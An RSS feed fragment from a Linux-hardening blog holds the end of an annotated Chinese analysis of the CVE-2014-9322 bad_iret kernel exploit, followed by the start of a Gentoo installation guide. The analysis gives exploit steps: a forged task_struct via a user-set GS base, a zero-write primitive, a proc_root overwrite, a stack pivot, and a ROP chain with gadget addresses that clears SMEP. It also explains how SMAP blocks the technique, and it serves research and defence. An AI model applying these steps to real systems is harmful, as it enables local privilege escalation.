    &lt;p&gt;swapgs（现在是GS指向内核空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;通过内存指令和gs前缀访问per-cpu内核数据结构&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;swapgs（撤销之前的swapgs，GS指向用户空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;返回用户空间&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;内核代码天生必须保证随时能访问到带gs前缀的percpu数据，内核执行一堆
swapgs指令时条目来自用户空间并不是偶然。(所以gs base指向内核内存）&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;4. 触发漏洞&lt;/h2&gt;

&lt;p&gt;现在很明显可以看到这个漏洞简直就是坟墓，因为多了一个swapgs指令在有漏洞
代码路径里，内核会尝试从可能被用户操控的错误GS基地址访问重要的数据结构。&lt;/p&gt;

&lt;p&gt;当iret指令产生了一个#SS异常？有趣的是，Intel白皮书在这方面介绍不完全(
Shawn:是阴谋论的话又会想到BIG BROTHER?)；描述iret指令时，Intel白皮书这
么讲：&lt;/p&gt;

&lt;pre&gt;
64位模式的异常：

#SS(0)

如果一个尝试从栈上pop一个值违反了SS限制。

如果一个尝试从栈上pop一个值引起了non-canonical地址（Shawn: 64-bit下只允
许访问canonical地址）的引用。
&lt;/pre&gt;

&lt;p&gt;没有一个条件能被强制在内核空间里发生。无论如何，Intel白皮书里的iret伪代
码展示了另外一种情况：when the segment defined by the return frame is
not present:&lt;/p&gt;

&lt;pre&gt;
IF stack segment is not present

THEN #SS(SS selector); FI;
&lt;/pre&gt;

&lt;p&gt;所以在用户空间，我们需要设置ss寄存器为某个值来表示不存在。这不是很直接：
我们不能仅仅使用：&lt;/p&gt;

&lt;pre&gt;
mov $nonpresent_segment_selector, %eax

mov %ax, %ss
&lt;/pre&gt;

&lt;p&gt;第二条指令会引发#GP。通过调试器（任何ptrace)设置ss寄存器是不允许的；类
似的，sys_sigreturn系统调用不会在64位系统上设置这个寄存器（可能32位能工
作）。解决方案是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt系统调用在LDT里创建一个定制段X&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：s:=X_selector&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt使X无效&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：等待硬件中断&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;为什么需要在一个进程里使用两个线程的原因是从系统调用（包括
sys_modify_ldt）返回是通过硬编码了#ss值的sysret指令。如果我们使X在相同
的线程中无效就等同于”ss:=X 指令“，ss寄存器会处于未完成设置的状态。运行
以上代码会导致内核panic。按照更有意义的做法，我们将需要控制用户空间的
gs基地址；她可以通过系统调用arch_prctl(ARCH_SET_GS)被设置。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive&quot;&gt;5. Achieving write primitive&lt;/h2&gt;

&lt;p&gt;如果运行以上代码，#SS处理程序会正常的返回bad_iret（意思是没有触及到内存
的GS基地址），之后转跳到#GP异常处理程序，执行一段时间后就调用到了这个函
数：&lt;/p&gt;

&lt;pre&gt;
289 dotraplinkage void
290 do_general_protection(struct pt_regs *regs, long error_code)
291 {
292         struct task_struct *tsk;
...
306         tsk = current;
307         if (!user_mode(regs)) {
                ... it is not reached
317         }
318 
319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
321 
322         if (show_unhandled_signals &amp;amp;&amp;amp; unhandled_signal(tsk, SIGSEGV) &amp;amp;&amp;amp;
323                         printk_ratelimit()) {
324                 pr_info(&quot;%s[%d] general protection ip:%lx sp:%lx
error:%lx&quot;,
325                         tsk-&amp;gt;comm, task_pid_nr(tsk),
326                         regs-&amp;gt;ip, regs-&amp;gt;sp, error_code);
327                 print_vma_addr(&quot; in &quot;, regs-&amp;gt;ip);
328                 pr_cont(&quot;\n&quot;);
329         }
330 
331         force_sig_info(SIGSEGV, SEND_SIG_PRIV, tsk);
332 exit:
333         exception_exit(prev_state);
334 }
&lt;/pre&gt;

&lt;p&gt;C代码不太明显，但从gs前缀读取到现有宏的值赋给了tsk。第306行是：&lt;/p&gt;

&lt;pre&gt;
0xffffffff8164b79d :	mov    %gs:0xc780,%rbx
&lt;/pre&gt;

&lt;p&gt;这很变得有意思起来了。我们控制了current指针，她指向用于描述整个Linux进
程的数据结构。&lt;/p&gt;
&lt;pre&gt;

319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
&lt;/pre&gt;

&lt;p&gt;写入（从task_struct开始的固定偏移）我们控制的地址。注意值本身不能被控制
（分别是0和0xd常量），但这不应该成为一个问题。游戏结束？&lt;/p&gt;

&lt;p&gt;不会，我们想覆盖一些在X上的重要数据结构。如果我们按照以下的步骤：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;准备在FAKE_PERCPU的用户空间内存，设置gs基地址给她&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让地址FAKE_PERCPU+0xc780存着指针FAKE_CURRENT_WITH_OFFSET，以满足
FAKE_CURRENT_WITH_OFFSET= X – offsetof(struct task_struct,
thread.error_code)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;触发漏洞&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后do_general_protection会写入X。但很快就会尝试再次访问current
task_current的其他成员，e.g.unhandled_signal()函数从task_struct指针解引
用。我们没有依赖X来控制，最终会在内核产生一个页错误。我们怎么避免这个问
题？选项有：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;什么都不做。Linux内核不像Windows，Linux内核是完全允许当一个不是预期
的页错误在内核出现，如果可能的话，内核会杀死当前进程之后尝试继续运行
（Windows会蓝屏）。这种机制对于大量内核数据污染就无能为力了。我的猜测是
在当前进程被杀死后，swapgs不平衡的保持下来，这会导致其他进程上下文的更
多页错误。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用“tsk-&amp;gt;thread.error_code = error_code”覆盖为页错误处理程序的IDT入
口。之后页错误发生（被unhandled_signal()触发）。这个技术曾经在一些偶然
的环境中成功过。但在这里不会成功，因为有2个原因：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;Linux让IDT只读&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;就算IDT可写，我们也不能控制覆盖的值 – 0或者0xd。SMEP/SMAP也
    会是问题。&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们可以尝试产生一个竞争。“tsk-&amp;gt;thread.error_code = error_code”会促
进代码执行，比如允许通过系统调用控制的代码指针P。之后我们可以在CPU 0上
触发漏洞，在同一时间段CPU 1可以循环执行一些系统调用。这个思路可以在CPU
0被破坏前让通过CPU 1获得代码执行，比如hook页错误处理程序，这样CPU 0不会
影响更多的地方，我尝试了这种方法多次，但都失败了。可能不同的漏洞在时间
线上的不同所致。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Throw a towel on “tsk-&amp;gt;thread.error_code = error_code” write.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然有些恶心，我们会尝试最后一个选项。我们会让current指向用户空间，设置
这个指针可以通过读的deref到我们能控制的内存。自然的，我们观察接下来的代
码，找找更多的写deref。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive-continued-aka-life-after-dogeneralprotection&quot;&gt;6. Achieving write primitive continued, aka life after do_general_protection&lt;/h2&gt;

&lt;p&gt;下一个机会是do_general_protection()所调用的函数：&lt;/p&gt;

&lt;pre&gt;
int
force_sig_info(int sig, struct siginfo *info, struct task_struct *t)
{
        unsigned long int flags;
        int ret, blocked, ignored;
        struct k_sigaction *action;

        spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
        action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
        ignored = action-&amp;gt;sa.sa_handler == SIG_IGN;
        blocked = sigismember(&amp;amp;t-&amp;gt;blocked, sig);   
        if (blocked || ignored) {
                action-&amp;gt;sa.sa_handler = SIG_DFL;
                if (blocked) {
                        sigdelset(&amp;amp;t-&amp;gt;blocked, sig);
                        recalc_sigpending_and_wake(t);
                }
        }
        if (action-&amp;gt;sa.sa_handler == SIG_DFL)
                t-&amp;gt;signal-&amp;gt;flags &amp;amp;= ~SIGNAL_UNKILLABLE;
        ret = specific_send_sig_info(sig, info, t);
        spin_unlock_irqrestore(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);

        return ret;
}
&lt;/pre&gt;

&lt;p&gt;task_struct的成员sighand是一个指针，我们可以设置任意值。&lt;/p&gt;

&lt;pre&gt;

action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
action-&amp;gt;sa.sa_handler = SIG_DFL;

&lt;/pre&gt;

&lt;p&gt;我们无法控制写的值，SIG_DFL是常量的0。这里最终能工作了，虽然有些扭曲。
假设我们想覆盖内核地址X。为此我们准备伪造的task_struct，所以X等于
t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的地址。上面还有一行要注意：&lt;/p&gt;

&lt;pre&gt;
spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
&lt;/pre&gt;

&lt;p&gt;t-&amp;gt;sighand-&amp;gt;siglock在t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的常量偏移
上，内核会调用spin_local_irqsave在某些地址上，X+SPINLOCK的内容无法控制。
这会发生什么呢？两种可能性：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;X+SPINLOCK所在的内存地址看起来像没有锁的spinlock。spin_lock_irqsave
会立即完成。最后，spin_unlock_irqrestore会撤销spin_lock_irqsave的写操作。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;2.X+SPINLOCK所在的内存地址看起来像上锁的spinlock。如果我们不介入的话，
spin_lock_irqsave会无线循环等待spinlock。有些担心，要绕过这个障碍我们得
需要其他假设 — X+SPINLOCK所在内存地址的内容。这是可接受的，我们可以在
后面看到在内核.data区域里设置X。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 首先，准备FAKE_CURRENT，让t-&amp;gt;sighand-&amp;gt;siglock指向用户空间上锁
      的区域，SPINLOCK_USERMODE

* force_sig_info()会挂在spin_lock_irqsave里

* 这时，另外一个用户空间的线程在另外一个CPU上运行，并且改变了
      t-&amp;gt;sighand，所以t-&amp;gt;sighand-&amp;gt;action[sig-1.sa.sa_hander成了我们
      的覆盖目标，之后解锁SPINLOCK_USERMODE

* spin_lock_irqsave会返回

* force_sig_info()会重新载入t-&amp;gt;sighand，执行期望的写操作
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;鼓励细心的读者追问为什么不能使用第2种方案，即X+SPINLOCK在初始时是没有锁
的。这并不是全部 — 我们需要准备一些FAKE_CURRENT的字段来让尽量少的代码
执行。我不会再透露更多细节 — 这篇BLOG已经够长了….下一步会发生什么？
force_sig_info()和do_general_protection()返回。接下来iret指令会再次产生
#SS异常处理（因为仍然是用户空间ss的值在栈上引用了一个nonpresent段），但
这一次，#SS处理程序里的额外swapgs指令会返回并取消之前不正确的swapgs。
do_general_protection()会调用和操作真正的task_struct，而不是伪造的
FAKE_CURRENT。最终，current会发出SIGSEGV信号，其他进程会被调度来执行。
这个系统仍然是稳定的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/diagram1.png?w=595&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;smep&quot;&gt;7. 插曲：SMEP&lt;/h2&gt;

&lt;p&gt;SMEP是Intel处理器从第3代Core（Shawn：酷睿）时加入的硬件特性。如果控制寄
存器CR4里的SMEP位被设置的话，当RING0（Shawn：标准Linux内核是RING0，在
XEN下是例外，RING0是Hypervisor）尝试执行的代码来自标记为用户空间的内存
页，CPU就会生成一个错误（Shawn：就是拒绝）。如果可能的话，Linux内核会默
认开启SMEP。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;8. 实现代码执行&lt;/h2&gt;

&lt;p&gt;之前的章节讲述了一种如何以0在内核内存中覆盖8个连续字节的方法。如果SMEP
开启的情况下如何实现代码执行呢？&lt;/p&gt;

&lt;p&gt;直接覆盖一个内核代码的指针是不行的。我们可以清零top bytes( Shawn: MSB)
- 但之后的地址会在用户空间，所以SMEP会阻止这个指针的deref。&lt;/p&gt;

&lt;p&gt;换一种方式，我们可以清零几个low bytes( Shawn: LSB)，但是之后能利用这个
指针的概率也很低。&lt;/p&gt;

&lt;p&gt;我们需要一个内核指针P指向结构X包含了代码指针。我们可以覆盖P的top bytes
让她成为一个用户空间的地址，这样P-&amp;gt;code_pointer_in_x()调用会跳转到一个
我们能选择的地址。我不确定最好选择哪个攻击对象。从我的经验来看，我选择
内核proc_root变量，这是一个结构体：&lt;/p&gt;

&lt;pre&gt;
struct proc_dir_entry {
            ...
        const struct inode_operations *proc_iops;
        const struct file_operations *proc_fops;
        struct proc_dir_entry *next, *parent, *subdir;
        ...
        u8 namelen;
        char name[];
};
&lt;/pre&gt;

&lt;p&gt;这个结构体是一个proc文件系统的入口（proc_root是/proc作为proc文件系统的
根目录）。当一个文件名路径开始在/proc里查询时，subdir指针（从
proc_root.subdir开始）会跟进，直到名字被找到。之后proc_iops的指针会被调
用：&lt;/p&gt;

&lt;pre&gt;
struct inode_operations {
        struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);
        void * (*follow_link) (struct dentry *, struct nameidata *);
        ...many more...
        int (*update_time)(struct inode *, struct timespec *, int);
        ...
} ____cacheline_aligned;
&lt;/pre&gt;

&lt;p&gt;proc_root驻扎在内核代码段里，这意味着漏洞利用需要知道她的地址。这个信息
可以从/proc/kallsyms符号表得到；当然，很多加固过的内核不允许普通用户读
取这个文件。但如果内核是一个已知的build（标准的GNU/Linux发行版），这个
地址可以轻松获得；和一堆偏移一样需要构建FAKE_CURRENT。&lt;/p&gt;

&lt;p&gt;我们会覆盖proc_root.subdir，让她成为一个指向一个在用户空间能被控制的结
构体proc_dir_entry。有点困难在于我们不能覆盖整个指针。别忘了我们的写操
作是“覆盖8个0”。如果我们让proc_root.subdir变成0，我们不会去映射她，因为
Linux内核不允许用户空间映射到地址0上（更确切的说发是，任何低于
/proc/sys/vm/mmap_min_addr的地址，默认值一般是4k）。（Shawn：想想哪些
0ld good hacking days，每天都有一堆NULL pointer deref是多么幸福活着无挑
战的时光啊;-))。这意味着我们需要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;映射16MB的内存到地址4096&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用类似proc_dir_entry的方式来填充，把inode_operations字段指向用户空
间的地址FAKE_IOPS，name字段为字符串”A”。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置漏洞利用去覆盖proc_root.subdir的top 5 bytes。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后，除非proc_root.subdir最低的3 bytes是0，我们可以确定在触发
force_sig_info()覆盖后，proc_root.subdir会指向被控制的用户空间内存。当
我们的进程调用open(“/proc/A”,…)时，FAKE_IOPS的指针会被调用。她们应该
指向哪里呢？如果你认为答案是“指向我们的shellcode“，请再读一遍上面的分析。&lt;/p&gt;

&lt;p&gt;我们需要让FAKE_IOPS指针指向一个stack pivot[1]序列。这再次假设了具体内核
运行的版本情况。通常的”xchg %esp, %eax; ret”代码序列（2个字节，94 c3是
在测试内核的地址0xffffffff8119f1ed）很好的可以用于64位内核的ROP。就算没
能控制%rax，这个xchg指令操作32位的寄存器也能清掉%rsp的高32位而让%rsp着
陆在用户空间的内存里。在最糟糕的情况下，我们可以分配低4GB的虚拟内存然后
填充ROP链条。&lt;/p&gt;

&lt;p&gt;在当前测试的内核（Fedora 20)有两种方法去deref在FAKE_IOPS的指针：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; call *SOME_OFFSET(%rax)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; %rax:=SOME_OFFSET(%rax); call *%rax&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第1种情况里，在%rsp和%rax交换值后，她会等于FAKE_IOPS。我们需要ROP链条驻
扎在FAKE_IOPS的起始位置，这需要类似“add $A_LOT, %rsp; ret”的指令，然后
在继续。&lt;/p&gt;

&lt;p&gt;第2种情况里，%rsp会分配低32位的调用目标，即0x8119f1ed。我们需要准备在这
个地址上的ROP链条。&lt;/p&gt;

&lt;p&gt;计算一下%rax值有两者之一的已知值在特定的时间指向stack pivot序列，我们不
需要ROP链条填充整个4GB内存，只需要上面的两个地址即可。第2种情况的ROP链
条自身很简洁：&lt;/p&gt;

&lt;pre&gt;
unsigned long *stack=0x8119f1ed;
*stack++=0xffffffff81307bcdULL;  // pop rdi, ret
*stack++=0x407e0;                //cr4 with smep bit cleared
*stack++=0xffffffff8104c394ULL;  // mov rdi, cr4; pop %rbp; ret
*stack++=0xaabbccdd;             // placeholder for rbp
*stack++=actual_shellcode_in_usermode_pages;
&lt;/pre&gt;

&lt;h2 id=&quot;smap&quot;&gt;9. 插曲：SMAP&lt;/h2&gt;

&lt;p&gt;SMAP是Intel从第5代Core处理器推出的一个硬件特性。如果CR4控制寄存器的
SMAP位被设置的话，CPU会拒绝用户空间的页被RING0访问（Shawn：个人理解，
SMAP和SMEP最大的不同主要是SMEP针对代码段，而SMAP针对数据段）。Linux内核
通常会默认开启SMAP。一个测试的内核模块（Core-M 5Y10a CPU）尝试访问用户
空间然后crash了：&lt;/p&gt;

&lt;pre&gt;
[  314.099024] running with cr4=0x3407e0
[  389.885318] BUG: unable to handle kernel paging request at 00007f9d87670000
[  389.885455] IP: [ffffffffa0832029] test_write_proc+0x29/0x50 [smaptest]
[  389.885577] PGD 427cf067 PUD 42b22067 PMD 41ef3067 PTE 80000000408f9867
[  389.887253] Code: 48 8b 33 48 c7 c7 3f 30 83 a0 31 c0 e8 21 c1 f0 e0 44 89 e0 48 8b 
&lt;/pre&gt;

&lt;p&gt;正如我们看到的，用户空间的页是正常的，但访问也报了页错误。Windows系统不
太支持SMAP；Windows 10技术预览版build 9926的cr4=0x1506f8（SMEP启动，
SMAP关闭）；对比Linux内核(同样的测试硬件）你可以看到cr4的bit 21是没有设
置的。这不奇怪，在Linux中，访问用户空间是通过调用copy_from_user(),
copy_to_user()和类似函数显式执行的，所以执行这些操作时临时关闭SMAP是可
行的。在Windows上，内核代码直接访问用户空间代码，只是包装了一层访问异常
处理程序，所以要让SMAP工作正常需要调整所有的驱动，这是一项困难的工作。&lt;/p&gt;

&lt;h2 id=&quot;smap-to-the-rescue&quot;&gt;10. SMAP to the rescue!&lt;/h2&gt;

&lt;p&gt;上面的漏洞利用方法依赖于在用户空间里准备特定的数据结构，然后强制内核认
为她们是可信的内核数据。这种方法对于开启SMAP特性的内核不奏效 — CPU会
拒绝从用户空间读取恶意数据。我们能做的是构造所有需要用的数据结构，然后
拷贝她们到内核。比如：&lt;/p&gt;

&lt;pre&gt;
write(pipe_filedescriptor, evil_data, ...
&lt;/pre&gt;

&lt;p&gt;之后evil_data会被拷贝到一个内核管道缓冲区里。我们可能需要猜测她的地址；
some sort of heap spraying, combined with the fact that there is no
spoon^W effective kernel ASLR[9], could work, although it is likely to be
less reliable than exploitation without SMAP.&lt;/p&gt;

&lt;p&gt;总之，还有最后一个障碍 — 不要忘了我们需要设置用户空间的gs base去指向
我们的漏洞利用的数据结构。在上面的场景（没有SMAP），我们使用
arch_prctl(ARCH_SET_GS)系统调用，她是这样在内核里实现的：&lt;/p&gt;

&lt;pre&gt;
long do_arch_prctl(struct task_struct *task, int code, unsigned long addr)
{ 
         int ret = 0; 
         int doit = task == current;
         int cpu;
 
         switch (code) { 
         case ARCH_SET_GS:
                 if (addr &amp;gt;= TASK_SIZE_OF(task))
                         return -EPERM; 
                 ... honour the request otherwise
&lt;/pre&gt;

&lt;p&gt;休斯顿，我们有一个麻烦 — 我们不能使用这个API去设置gs base用户空间以上
的内存！&lt;/p&gt;

&lt;p&gt;最近的CPU有wrgsbase指令可以直接设置gs base，这是一个非特权级指令，但需
要通过内核设置CR4控制寄存器中的FSGSBASE bit( no 16)来开启。Linux并没有
设置这个位，因此用户空间不能使用这条指令。&lt;/p&gt;

&lt;p&gt;在64位系统上，非系统级的GDT和LDT条目依然是8个字节长，base field是最大
4GB-1，所以根本没有机会设置一个基地址的段在内核空间里。所以，除非我漏掉
了能在内核里设置用户态gs base的其他方法，不然SMAP能保护CVE-2014-9322针
对64位Linux内核任意代码执行的漏洞利用。&lt;/p&gt;

&lt;p&gt;[1] CVE-2014-9322 
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&lt;/p&gt;

&lt;p&gt;[2] Upstream fix
    http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6f442be2fb22be02cafa606f1769fa1e6f894441&lt;/p&gt;

&lt;p&gt;[3] Intel Software Developer’s Manuals,
    http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&lt;/p&gt;

&lt;p&gt;[4] SMEP
    http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/&lt;/p&gt;

&lt;p&gt;[5] SMAP
    http://lwn.net/Articles/517475&lt;/p&gt;

&lt;p&gt;[6] “pretend-it-was-#GP-in-userspace”
    https://lists.debian.org/debian-kernel/2014/12/msg00083.html&lt;/p&gt;

&lt;p&gt;[7] Stack Pivoting
    https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf&lt;/p&gt;

&lt;p&gt;[8] TSX improves timing attacks against KASLR
    http://labs.bromium.com/2014/10/27/tsx-improves-timing-attacks-against-kaslr/&lt;/p&gt;
</description>
        <pubDate>Sun, 05 Jul 2015 22:46:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Gentoo GNU/Linux系统安装与加固</title>
        <description>&lt;p&gt;By: Ciphergateway&lt;/p&gt;

&lt;p&gt;–[  目录&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;准备工作&lt;/li&gt;
  &lt;li&gt;组建RAID1&lt;/li&gt;
  &lt;li&gt;安装Gentoo系统
3.1 livecd下配置安装环境
3.2 Gentoo安装及编译
3.3 软件环境安装&lt;/li&gt;
  &lt;li&gt;Gentoo内核加固
4.1 加固选项设置
4.2 编译gentoo hardened内核&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;–[ 1、准备工作&lt;/h2&gt;

&lt;p&gt;用U盘启动引导安装gentoo系统，将gentoo系统的镜像文件livedvd-amd64-multilib-20140826.iso拷贝到已经格式化过的格式为fat32的U盘中；&lt;/p&gt;

&lt;p&gt;U盘镜像下载链接：&lt;a href=&quot;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&quot; title=&quot;下载链接&quot;&gt;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;raid1&quot;&gt;–[ 2、组建RAID1&lt;/h2&gt;

&lt;p&gt;1）Advanced Mode–&amp;gt;高级–&amp;gt;cpu设置，将Intel虚拟技术设为开启；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ljVLrxi.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）Advanced Mode–&amp;gt;高级–&amp;gt;PCH存储设置，将SATA模式选择为RAID；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/K6rDKtM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）保存设置并重启，按Ctrl+I(分别按不是同时按)，进入RAID配置界面，将两块3T机械硬盘组建为RAID1;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/XjgyVIQ.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gentoo&quot;&gt;–[ 3、安装Gentoo系统&lt;/h2&gt;

&lt;h3 id=&quot;livecd&quot;&gt;—-[ 3.1 livecd下配置安装环境&lt;/h3&gt;

&lt;p&gt;1）服务器上插入U盘，配置root账户，开启sshd服务:
　
&lt;img src=&quot;http://i.imgur.com/LUPazv2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）使用gentoo livecd中自带的分区工具gdisk为系统分区，机械盘分两区，固态盘分五区(实际使用过程中使用cfdisk，gparted也可，我使用给gdisk的原因是这次在对raid盘进行分区时使用gparted造成了gpt与mbr分区表同时存在的问题，使用cfdisk将整个分区识别为了一个名为gpt的主分区)，以下是两块硬盘的分区结果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/LytBlwM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/pJ1S2K2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）利用secureCRT登陆系统shell(链接前先要确认主机的ip，并确保两个主机处于同一网段，如果只有一台电脑，也可以在该主机上直接操作)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/y5eo8Qh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4）制作文件系统(格式化分区，默认格式成了ext4分区，如有需要，也可以格式成其他格式的分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkfs.ext4 /dev/sda3
    mkfs.ext4 /dev/sda4
    mkfs.ext4 /dev/sda5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/6x8T18i.jpg&quot; alt=&quot;&quot; /&gt;
设置swap分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkswap /dev/sda2 ![](http://i.imgur.com/FX6HKRi.png) 格式化其他分区
    mkfs.fat /dev/sda1
    mkfs.ext4 /dev/md126p1
    mkfs.ext4 /dev/md126p2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wVi2cPS.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）挂载分区（将两块硬盘以目录树的形式挂载在/mnt）(分区用途/dev/sda1 efi分区，才用mbr引导的可忽略此份区，/dev/sda3 tmp分区，/den/sda4 根分区，/dev/sda5 home分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; mount /dev/sda4/mnt/gentoo
 mkdir -p/mnt/gentoo/boot/efi
 mount /dev/sda1/mnt/gentoo/boot/efi
 mount -p/mnt/gentoo/home
 mount /dev/sda5/mnt/gentoo/home
 mkdir /mnt/gentoo/tmp
 mount /dev/sda3/mnt/gentoo/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）设置系统时间(注意 日期格式为MMddhhmmyyyy)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;date 061915262015
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）下载系统编译包portage-latest.tar.bz2和stage3-amd64-20150618.tar.bz2到/mnt/gentoo目录下(注意，镜像源我们选择的是阿里云的镜像，使用者可自行更换，下载stage3包时要选择日期最近的)：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget http://mirrors.aliyun.com/gentoo/releases/snapshots/current/portage-latest.tar.bz2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1YOrwhV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt; wget http://mirrors.ustc.edu.cn/gentoo/releases/amd64/autobuilds/current-stage3-amd64/stage3-amd64-20150618.tar.bz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gNpBpCX.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;8）解压stage3和portage两个文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf stage3-amd64-20150618.tar.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: stage3-amd64-20131010.tar.bz2解压的文件是Gentoo的目录结构，所以要解压到临时的系统目录下,即/mnt/gentoo，方便后面进行chroot&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf portage-latest.tar.bz2 -C /mnt/gentoo/usr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: portage-latest.tar.bz2解压的文件为系统软件目录结构,需要解压到/mnt/gentoo/usr目录下&lt;/p&gt;

